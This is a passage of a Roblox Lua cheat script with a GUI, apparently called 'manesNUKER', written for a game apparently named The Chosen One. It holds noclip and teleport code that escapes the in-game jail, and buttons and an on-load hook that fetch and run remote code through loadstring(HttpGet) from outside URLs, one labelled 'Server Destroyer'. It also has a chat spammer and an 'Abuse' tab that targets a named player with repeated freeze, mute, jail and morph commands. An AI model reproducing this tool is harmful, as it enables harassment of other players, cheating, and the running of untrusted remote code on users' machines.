    for _, e in ipairs(Lighting:GetChildren()) do
        if e:IsA("ColorCorrectionEffect") then
            e.Brightness=0; e.Contrast=0; e.Saturation=0; e.TintColor=Color3.new(1,1,1)
        end
        if e:IsA("BlurEffect") then e.Size=0 end
    end
    Lighting.Ambient=Color3.fromRGB(127,127,127)
    Lighting.OutdoorAmbient=Color3.fromRGB(127,127,127)
    Lighting.Brightness=2
end

createToggle(pgAnti, "🎨  Anti Colorblind", function(v)
    if v then
        resetColors()
        addConn("color", RunService.Heartbeat:Connect(function()
            if math.random(1,60)==1 then resetColors() end
        end))
    else killConn("color") end
end, CW, 46)

-- ============================================================
-- ANTI JAIL (VPLI method)
-- Cast 4 horizontal rays every 20 frames.
-- 4 sides blocked within 6 studs = jailed.
-- Escape: temporarily CanCollide=false on all char parts,
-- burst upward, tp to last saved open position.
-- ============================================================
local lastOpenPos = nil

createToggle(pgAnti, "⛓  Anti Jail", function(v)
    if v then
        addConn("jail", RunService.Heartbeat:Connect(function()
            if math.random(1,20)~=1 then return end
            local char = LocalPlayer.Character; if not char then return end
            local hrp  = char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
            local pos  = hrp.Position
            local rp   = RaycastParams.new()
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local fx = {}
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Character then table.insert(fx, p.Character) end
            end
            rp.FilterDescendantsInstances = fx
            local dirs  = {Vector3.new(1,0,0),Vector3.new(-1,0,0),Vector3.new(0,0,1),Vector3.new(0,0,-1)}
            local blocked = 0
            for _, d in ipairs(dirs) do
                if workspace:Raycast(pos, d*6, rp) then blocked=blocked+1 end
            end
            if blocked < 4 then
                lastOpenPos = pos
            else
                print("[ANTI JAIL] Jailed — escaping via noclip")
                local parts = {}
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("BasePart") and p.CanCollide then
                        table.insert(parts, p); p.CanCollide=false
                    end
                end
                hrp.AssemblyLinearVelocity = Vector3.zero
                hrp.CFrame = CFrame.new(pos + Vector3.new(0,30,0))
                task.wait(0.1)
                hrp.CFrame = CFrame.new((lastOpenPos or Vector3.new(0,5,0)) + Vector3.new(0,5,0))
                for _, p in ipairs(parts) do pcall(function() p.CanCollide=true end) end
            end
        end))
    else
        killConn("jail"); lastOpenPos=nil
    end
end, CW, 46)



-- ============================================================
-- PAGE 8: SCRIPTS
-- ============================================================
createLabel(pgScripts, "  Scripts", Color3.fromRGB(80,80,120), 13)
createDivider(pgScripts)

-- Auto-execute flags (only run when codeXxmane is executed)
local autoExecVPLI  = false
local autoExecExtra = false

-- VPLI HUB V2 SERVER DESTROYER
createLabel(pgScripts, "  VPLI HUB V2 Server Destroyer", Color3.fromRGB(11,95,226), 13)
local vpliAutoToggle = createToggle(pgScripts, "⚡  Auto Execute (on load)", function(v)
    autoExecVPLI = v
end, CW, 38)

createButton(pgScripts, "▶  Execute VPLI Server Destroyer", function()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Protected_6361979247750901.txt"))()
        end)
    end)
end, CW, 46)

createDivider(pgScripts)

-- EXTRA STUFF UPDATED
createLabel(pgScripts, "  Extra Stuff Updated (2AREYOUMENTAL110)", Color3.fromRGB(11,95,226), 13)
local extraAutoToggle = createToggle(pgScripts, "⚡  Auto Execute (on load)", function(v)
    autoExecExtra = v
end, CW, 38)

createButton(pgScripts, "▶  Execute Extra Stuff", function()
    task.spawn(function()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Lib-18698"))()
        end)
    end)
end, CW, 46)

createDivider(pgScripts)
createLabel(pgScripts, "  Auto execute runs scripts when codeXxmane loads", Color3.fromRGB(80,80,120), 11)

-- Run auto-executes on load
task.spawn(function()
    task.wait(2) -- wait for game to fully load
    if autoExecVPLI then
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Adam3mka/The-chosen-one-lukaku/refs/heads/main/Protected_6361979247750901.txt"))()
        end)
    end
    if autoExecExtra then
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Lib-18698"))()
        end)
    end
end)

-- ============================================================
-- ============================================================
-- PAGE 9: AUTO DONATE
-- Spams ;donate <player> <yourtime> every 5 seconds
-- ============================================================
createLabel(pgDonate, "  Auto Donate", Color3.fromRGB(80,80,120), 13)
createLabel(pgDonate, "  Spams ;donate every 5s using your full time", Color3.fromRGB(11,95,226), 11)
createDivider(pgDonate)

local donateTarget    = ""
local donateActive    = false
local donateThread    = nil

-- Target name input
local donateBox = createTextBox(pgDonate, "Player name to donate to...", CW, 36)
donateBox.ClearTextOnFocus = false
donateBox:GetPropertyChangedSignal("Text"):Connect(function()
    donateTarget = donateBox.Text
end)

-- Get my current time stat (checks common stat names)
local function getMyTime()
    local ls  = LocalPlayer:FindFirstChild("leaderstats")
    if not ls then return nil end
    -- Common time stat names in The Chosen One
    local candidates = {"Time","Minutes","Seconds","Hours","Playtime","Score","Points"}
    for _, n in ipairs(candidates) do
        local s = ls:FindFirstChild(n)
        if s then return tostring(math.floor(tonumber(s.Value) or 0)) end
    end
    -- Fallback: return first int/numbervalue
    for _, v in ipairs(ls:GetChildren()) do
        if v:IsA("IntValue") or v:IsA("NumberValue") then
            return tostring(math.floor(tonumber(v.Value) or 0))
        end
    end
    return nil
end

-- Send chat using TextChatService (from Extra Stuff source)
local function sendChat(text)
    coroutine.wrap(function()
        pcall(function()
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(text)
        end)
    end)()
end

createToggle(pgDonate, "💸  Auto Donate ON/OFF", function(v)
    donateActive = v
    if v then
        if donateTarget == "" then
            print("[DONATE] Set a player name first!")
            donateActive = false
            return
        end
        donateThread = task.spawn(function()
            while donateActive do
                local myTime = getMyTime()
                if myTime and tonumber(myTime) and tonumber(myTime) > 0 then
                    local msg = ";donate " .. donateTarget .. " " .. myTime
                    sendChat(msg)
                    print("[DONATE] Sent: " .. msg)
                else
                    print("[DONATE] Could not read your time stat")
                end
                task.wait(5)
            end
        end)
    else
        if donateThread then task.cancel(donateThread); donateThread=nil end
        print("[DONATE] Stopped")
    end
end, CW, 46)

createButton(pgDonate, "💬  Send Once Now", function()
    local target = donateBox.Text
    if target == "" then print("[DONATE] No target set"); return end
    local myTime = getMyTime()
    if myTime then
        local msg = ";donate " .. target .. " " .. myTime
        sendChat(msg)
        print("[DONATE] Sent: " .. msg)
    else
        print("[DONATE] Could not read time stat")
    end
end, CW, 38)

-- ============================================================
-- PAGE 10: ABUSE
-- Targets a player — spams admin commands every 3s
-- Abuse tab
-- ============================================================
createLabel(pgAbuse, "  Abuse", Color3.fromRGB(80,80,120), 13)
createLabel(pgAbuse, "  Spams commands on target every 3s", Color3.fromRGB(11,95,226), 11)
createDivider(pgAbuse)

local abuseTarget    = ""
local abuseActive    = false
local abuseThread    = nil

-- Target input
local abuseBox = createTextBox(pgAbuse, "Target player name...", CW, 36)
abuseBox.ClearTextOnFocus = false
abuseBox:GetPropertyChangedSignal("Text"):Connect(function()
    abuseTarget = abuseBox.Text
end)

-- Find player by partial name
local function findPlayer(name)
    local lower = name:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():find(lower, 1, true)
        or p.DisplayName:lower():find(lower, 1, true) then
            return p
        end
    end
    return nil
end

-- Check if we have Enlighten tool
local function getEnlighten()
    local char = LocalPlayer.Character
    local tool = (char and char:FindFirstChild("Enlighten"))
             or LocalPlayer.Backpack:FindFirstChild("Enlighten")
    return tool
end

local function equipEnlighten()
    local tool = getEnlighten()
    if not tool then return false end
    if tool.Parent ~= LocalPlayer.Character then
        tool.Parent = LocalPlayer.Character
        task.wait(0.15)
    end
    return LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Enlighten") ~= nil
end

-- The abuse sequence for one cycle
local abuseCmds = {
    function(n) sendChat(";freeze "  .. n) end,
    function(n) sendChat(";glitch "  .. n) end,
    function(n) sendChat(";mute "    .. n) end,
    function(n) sendChat(";jail "    .. n) end,
    function(n) sendChat(";morph "   .. n .. " dont1play2with3me") end,
}

local function runAbuseCycle(targetName)
    -- Check Enlighten
    local enli = getEnlighten()
    if not enli then
        print("[ABUSE] ⚠ Enlighten tool not found in backpack! Commands may not work.")
    else
        equipEnlighten()
        print("[ABUSE] ✓ Enlighten equipped")
    end

    for _, cmd in ipairs(abuseCmds) do
        if not abuseActive then break end
        pcall(function() cmd(targetName) end)
        task.wait(0.4)
    end
end

-- Abuse status label
local abuseStatusLbl = createLabel(pgAbuse, "  Status: Inactive", Color3.fromRGB(116,113,117), 12)

local function setAbuseStatus(txt, col)
    if abuseStatusLbl then
        abuseStatusLbl.Text = "  Status: " .. txt
        abuseStatusLbl.TextColor3 = col or Color3.fromRGB(116,113,117)
    end
    print("[ABUSE] " .. txt)
end

-- Start abuse loop (no rejoin detection)
local function startAbuse(name)
    if name == "" then
        setAbuseStatus("No target set!", Color3.fromRGB(255,80,80))
        return
    end

    abuseActive = true
    setAbuseStatus("Targeting: " .. name, Color3.fromRGB(11,95,226))

    abuseThread = task.spawn(function()
        while abuseActive do
            local target = findPlayer(name)
            if target then
                runAbuseCycle(target.Name)
            else
                setAbuseStatus("Target not in server: " .. name, Color3.fromRGB(255,180,0))
            end
            task.wait(3)
        end
    end)
end

local function stopAbuse()
    abuseActive = false
    if abuseThread then task.cancel(abuseThread); abuseThread = nil end
    setAbuseStatus("Inactive", Color3.fromRGB(116,113,117))
end

createToggle(pgAbuse, "💀  Abuse ON/OFF", function(v)
    if v then
        startAbuse(abuseBox.Text)
    else
        stopAbuse()
    end
end, CW, 46)

-- Individual command buttons
createDivider(pgAbuse)
createLabel(pgAbuse, "  Manual Commands", Color3.fromRGB(80,80,120), 12)

createButton(pgAbuse, "🧊  Freeze",    function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";freeze " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "🌀  Glitch",    function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";glitch " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "🔇  Mute",      function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";mute " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "⛓  Jail",      function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";jail " .. t.Name) end
end, CW, 36)
createButton(pgAbuse, "👹  Morph (dont1play2with3me)", function()
    local t = findPlayer(abuseBox.Text)
    if t then sendChat(";morph " .. t.Name .. " dont1play2with3me") end
end, CW, 36)

-- Enlighten status check button
createDivider(pgAbuse)
createButton(pgAbuse, "🔦  Check Enlighten Tool", function()
    local enli = getEnlighten()
    if enli then
        print("[ABUSE] ✓ Enlighten found: " .. enli.Parent.Name)
        setAbuseStatus("Enlighten ✓ found in " .. enli.Parent.Name, Color3.fromRGB(11,95,226))
    else
        print("[ABUSE] ✗ Enlighten NOT found in character or backpack")
        setAbuseStatus("Enlighten NOT found!", Color3.fromRGB(255,80,80))
    end
end, CW, 38)

-- ============================================================
-- PAGE 11: SAVE ENLIGHTEN
-- Uses Classic Bucket gear (ID 25162389) to clone self
-- Detects if Enlighten tool is equipped before cloning
-- Method from Extra Stuff UPDATED source (gear me + SendAsync)
-- ============================================================
createLabel(pgSaveEnli, "  Save Enlighten", Color3.fromRGB(80,80,120), 13)
createLabel(pgSaveEnli, "  Clones you using Bucket gear to save your Enlighten", Color3.fromRGB(11,95,226), 11)
createDivider(pgSaveEnli)

-- Enlighten status display
local enliStatusLbl = createLabel(pgSaveEnli, "  Enlighten: Not checked", Color3.fromRGB(116,113,117), 12)

local function getEnlightenTool()
    local char = LocalPlayer.Character
    return (char and char:FindFirstChild("Enlighten"))
        or LocalPlayer.Backpack:FindFirstChild("Enlighten")
end

local function setEnliStatus(txt, col)
    enliStatusLbl.Text      = "  Enlighten: " .. txt
    enliStatusLbl.TextColor3 = col or Color3.fromRGB(116,113,117)
end

-- Check Enlighten button
createButton(pgSaveEnli, "🔦  Check Enlighten Tool", function()
    local enli = getEnlightenTool()
    if enli then
        local loc = enli.Parent == LocalPlayer.Character and "Equipped ✓" or "In Backpack"
        setEnliStatus(loc, Color3.fromRGB(11, 200, 80))
        print("[SAVE ENLI] ✓ Enlighten found — " .. loc)
    else
        setEnliStatus("NOT FOUND ✗", Color3.fromRGB(255, 60, 60))
        print("[SAVE ENLI] ✗ Enlighten NOT found in character or backpack!")
    end
end, CW, 38)

createDivider(pgSaveEnli)
createLabel(pgSaveEnli, "  Bucket Gear Clone", Color3.fromRGB(80,80,120), 12)
createLabel(pgSaveEnli, "  Runs: gear me 25162389 (Classic Bucket)", Color3.fromRGB(60,60,90), 11)

-- Core save function: check enli → equip it → give bucket gear → clone
local function doSaveEnlighten()
    local enli = getEnlightenTool()
    if not enli then
        setEnliStatus("NOT FOUND — equip it first! ✗", Color3.fromRGB(255, 60, 60))
        print("[SAVE ENLI] ✗ No Enlighten found! Equip it first.")
        return false
    end

    -- Make sure enlighten is equipped (in character, not backpack)
    if enli.Parent ~= LocalPlayer.Character then
        enli.Parent = LocalPlayer.Character
        task.wait(0.2)
    end
    setEnliStatus("Equipped ✓ — Cloning...", Color3.fromRGB(11, 200, 80))
    print("[SAVE ENLI] ✓ Enlighten equipped — sending bucket gear command")

    -- Send bucket gear command via RBXGeneral (Extra Stuff method)
    coroutine.wrap(function()
        pcall(function()
            -- Give self Classic Bucket gear (ID 25162389)
            game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("gear me 25162389")
        end)
    end)()

    task.wait(1.5) -- wait for gear to appear

    -- Equip and activate the bucket to clone
    task.spawn(function()
        local tries = 0
        repeat
            tries = tries + 1
            local bucket = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Classic Bucket")
                        or LocalPlayer.Backpack:FindFirstChild("Classic Bucket")
            if bucket then
                if bucket.Parent ~= LocalPlayer.Character then
                    bucket.Parent = LocalPlayer.Character
                    task.wait(0.15)
                end
                -- Activate (use) the bucket to clone
                pcall(function() bucket:Activate() end)
                pcall(function()
                    local clickEvent = bucket:FindFirstChild("ClickDetector")
                    if clickEvent then clickEvent.MouseClick:Fire(LocalPlayer) end
                end)
                setEnliStatus("Clone sent! ✓", Color3.fromRGB(11, 200, 80))
                print("[SAVE ENLI] ✓ Bucket activated — clone sent!")
                return
            end
            task.wait(0.5)
        until tries >= 6
        -- Bucket didn't appear — just fire the command again
        coroutine.wrap(function()
            pcall(function()
                game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("gear me 25162389")
            end)
        end)()
        setEnliStatus("Gear cmd sent (check chat) ✓", Color3.fromRGB(11, 200, 80))
        print("[SAVE ENLI] Bucket not found in inventory — gear command resent, use it manually")
    end)
    return true
end

-- Save Enlighten button
createButton(pgSaveEnli, "💡  SAVE ENLIGHTEN (Clone Me)", function()
    task.spawn(doSaveEnlighten)
end, CW, 50)

createDivider(pgSaveEnli)

-- Auto Save Enlighten toggle (runs every 30s to keep clone fresh)
local autoSaveEnliActive = false
local autoSaveThread     = nil

createToggle(pgSaveEnli, "🔄  Auto Save Enlighten (every 30s)", function(v)
    autoSaveEnliActive = v
    if v then
        autoSaveThread = task.spawn(function()
            while autoSaveEnliActive do
                doSaveEnlighten()
                task.wait(30)
            end
        end)
        print("[SAVE ENLI] Auto save ON")
    else
        if autoSaveThread then task.cancel(autoSaveThread); autoSaveThread = nil end
        setEnliStatus("Auto save stopped", Color3.fromRGB(116,113,117))
        print("[SAVE ENLI] Auto save OFF")
    end
end, CW, 42)

createLabel(pgSaveEnli, "  Tip: equip Enlighten first, then press Save", Color3.fromRGB(60,60,90), 11)

-- PAGE 12: CREDITS — text only, no buttons
-- ============================================================
local credLbl = Instance.new("TextLabel", pgCredits)
credLbl.Size                   = UDim2.fromOffset(CW, 300)
credLbl.BackgroundTransparency = 1
credLbl.Text                   = "credit to stik for ui\nand the nuker script\n\nand credits to kii akira\nfor the god mode code"
credLbl.Font                   = Enum.Font.GothamBold
credLbl.TextSize               = 22
credLbl.TextColor3             = Color3.fromRGB(116, 113, 117)
credLbl.TextWrapped            = true
credLbl.TextXAlignment         = Enum.TextXAlignment.Center
credLbl.TextYAlignment         = Enum.TextYAlignment.Center

-- ============================================================
-- INIT
-- ============================================================
updatePage()
print("[manesNUKER] Loaded! Use < > to switch pages")
